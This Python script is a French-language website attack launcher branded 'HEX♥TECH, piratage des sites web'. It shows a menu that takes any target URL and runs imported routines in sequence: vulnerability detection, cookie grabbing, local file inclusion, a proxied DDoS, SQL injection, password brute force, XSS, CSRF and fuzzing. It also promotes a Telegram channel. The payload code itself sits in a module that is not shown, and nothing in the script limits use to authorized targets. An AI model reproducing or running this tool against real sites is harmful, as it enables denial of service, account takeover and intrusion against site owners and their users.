import requests
from termcolor import colored
import random
import time
import socket
import threading
from tests import (
    detect_vulnerability,
    get_cookies,
    lfi_test,
    ddos_attack_with_proxies,
    bruteforce_attack_with_proxies,
    advanced_sql_injection_test,
    xss_attack,
    csrf_attack,
    fuzzing_attack,
)

# Liste de proxies à utiliser
PROXY_LIST = ["http://proxy1", "http://proxy2", "http://proxy3"]

def afficher_menu():
    print(colored("""
    ****************************************
    *        𝗕𝗜𝗘𝗡𝗩𝗘𝗡𝗨𝗘 𝗦𝗨𝗥 𝗛𝗘𝗫♥︎𝗧𝗘𝗖𝗛  ⚕️  *
    ****************************************
    """, "blue"))
    print(colored("""
    ****************************************
    *          𝙷𝙴𝚇✦𝚃𝙴𝙲𝙷                   ✦
    *  ＰＩＲＡＴＡＧＥ ＤＥＳ ＳＩＴＥ ＷＥＢ©  ✦
    *
    * 1. Entrer l'URL du site cible        *
    * 2. Rejoindre notre canal Telegram    *
    * 3. Effectuer une attaque XSS         *
    * 4. Effectuer une attaque CSRF        *
    * 5. Effectuer un fuzzing              *
    ****************************************
    """, "green", attrs=["bold", "underline"]))

def main():
    afficher_menu()
    choix = input(colored("Choisissez une option (1, 2, 3, 4, 5) : ", "green"))
    
    if choix == "1":
        url = input("Entrez l'URL du site cible : ")
        if validate_url(url):
            print(f"Analyse en cours sur {url}...\n")
            run_tests(url)
        else:
            print(colored("URL invalide. Veuillez entrer une URL correcte.", "red"))
    elif choix == "2":
        print("Redirection vers le canal Telegram...")
        open_telegram_channel()
    elif choix == "3":
        url = input("Entrez l'URL du site cible : ")
        if validate_url(url):
            print(f"Lancement de l'attaque XSS sur {url}...\n")
            xss_attack(url)
        else:
            print(colored("URL invalide. Veuillez entrer une URL correcte.", "red"))
    elif choix == "4":
        url = input("Entrez l'URL du site cible : ")
        if validate_url(url):
            print(f"Lancement de l'attaque CSRF sur {url}...\n")
            csrf_attack(url)
        else:
            print(colored("URL invalide. Veuillez entrer une URL correcte.", "red"))
    elif choix == "5":
        url = input("Entrez l'URL du site cible : ")
        if validate_url(url):
            print(f"Lancement du fuzzing sur {url}...\n")
            fuzzing_attack(url)
        else:
            print(colored("URL invalide. Veuillez entrer une URL correcte.", "red"))
    else:
        print(colored("Option invalide. Veuillez réessayer.", "red"))
        main()

def validate_url(url):
    """
    Vérifie si l'URL fournie est valide.
    """
    try:
        response = requests.get(url, timeout=5)
        return response.status_code == 200
    except requests.RequestException:
        return False

def open_telegram_channel():
    """
    Ouvre le lien du canal Telegram.
    """
    try:
        import os
        os.system("xdg-open https://t.me/+IcftRA7eTCNiOGFk?start=7699384839")
    except Exception as e:
        print(colored(f"Erreur lors de l'ouverture de Telegram : {e}", "red"))

def run_tests(url):
    print(colored("[DANGER⚠️ ⚠️] Début de l'injection ...", "cyan"))

    # Détection de vulnérabilités
    try:
        if detect_vulnerability(url):
            print(colored("[+] Vulnérabilité confirmée.", "green"))
        else:
            print(colored("[RAPPORT ☣️] Pas de vulnérabilités détectées.", "red"))
    except Exception as e:
        print(colored(f"Erreur lors de la détection de vulnérabilité : {e}", "red"))

    # Récupération de cookies
    try:
        cookies = get_cookies(url)
        if cookies:
            print(colored(f"[+] Cookies trouvés : {cookies}", "green"))
    except Exception as e:
        print(colored(f"Erreur lors de la récupération des cookies : {e}", "red"))

    # Test d'inclusion de fichier local (LFI)
    try:
        lfi_result = lfi_test(url)
        if lfi_result:
            print(colored(f"[+] Contenu du fichier : {lfi_result}", "green"))
        else:
            print(colored("[HEXTECH] Test LFI échoué.", "red"))
    except Exception as e:
        print(colored(f"Erreur lors du test LFI : {e}", "red"))

    # Lancement de l'attaque DDoS
    try:
        ddos_thread = threading.Thread(target=ddos_attack_with_proxies, args=(url,))
        ddos_thread.start()
        ddos_thread.join()
    except Exception as e:
        print(colored(f"Erreur lors de l'attaque DDoS : {e}", "red"))

    # Test d'injection SQL avancée
    try:
        advanced_sql_injection_test(url)
    except Exception as e:
        print(colored(f"Erreur lors du test SQL avancé : {e}", "red"))

    # Délai de 10 secondes pour l'attaque bruteforce
    print(colored("[*] Attente de 5 secondes avant de commencer l'attaque brute force...", "yellow"))
    time.sleep(10)  # Délai de 10 secondes

    # Test de bruteforce avec proxy (Exécuté en dernier)
    try:
        print(colored("[ＷＡＲＮＩＮＧ⚠️] Démarrage de l'attaque brute force...", "yellow"))
        bruteforce_result = bruteforce_attack_with_proxies(url, chars="ab", max_length=3)
        if bruteforce_result:
            print(colored(f"[✦] Bruteforce réussi avec : {bruteforce_result}", "green"))
        else:
            print(colored("[-] Bruteforce échoué.", "red"))
    except Exception as e:
        print(colored(f"Erreur lors de l'attaque bruteforce : {e}", "red"))

    # Lancer les attaques CSRF et Fuzzing
    try:
        print(colored("[HEXTECH] Lancement des attaques supplémentaires...", "yellow"))
        csrf_attack(url)
        fuzzing_attack(url)
    except Exception as e:
        print(colored(f"Erreur lors des attaques supplémentaires : {e}", "red"))

    print(colored("[*] Tests terminés.", "cyan"))

if __name__ == "__main__":
    main()
